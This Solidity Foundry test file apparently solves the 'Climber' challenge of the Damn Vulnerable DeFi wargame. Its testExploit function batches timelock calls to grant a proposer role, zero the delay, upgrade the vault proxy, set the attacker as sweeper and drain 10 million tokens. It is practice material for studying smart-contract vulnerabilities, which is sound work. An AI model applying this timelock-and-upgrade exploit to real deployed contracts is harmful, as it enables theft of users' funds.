// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {ClimberVaultV2} from "../../../src/Contracts/climber/ClimberVaultV2.sol";
import {ClimberExploit} from "../../../src/Contracts/climber/ClimberExploit.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    // struct Transactions {
    //     address target;
    //     uint256 value;
    //     bytes dataElements;
    // }

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        ClimberVaultV2 climberImplementationV2 = new ClimberVaultV2();
        ClimberExploit climberExploit = new ClimberExploit(
            address(climberTimelock)
        );

        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);

        // First transaction will grant ClimberExploit contract proposer role

        targets[0] = address(climberTimelock);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(climberExploit)
        );

        // Update delay to zero

        targets[1] = address(climberTimelock);
        dataElements[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            0 days
        );

        // Change implementation . New implementation has a function to change sweeper

        targets[2] = address(climberVaultProxy);
        dataElements[2] = abi.encodeWithSignature(
            "upgradeTo(address)",
            climberImplementationV2
        );

        // Change sweeper address to attacker address

        targets[3] = address(climberVaultProxy);
        dataElements[3] = abi.encodeWithSignature(
            "setSweeper(address)",
            attacker
        );

        // Call propose function on climber exploit custom contract

        targets[4] = address(climberExploit);
        dataElements[4] = abi.encodeWithSignature("propose()");

        climberExploit.setCalldata(
            targets,
            dataElements,
            keccak256("whitehat")
        );

        climberTimelock.execute(
            targets,
            values,
            dataElements,
            keccak256("whitehat")
        );

        vm.prank(attacker);
        ClimberVault(address(climberVaultProxy)).sweepFunds(address(dvt));

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
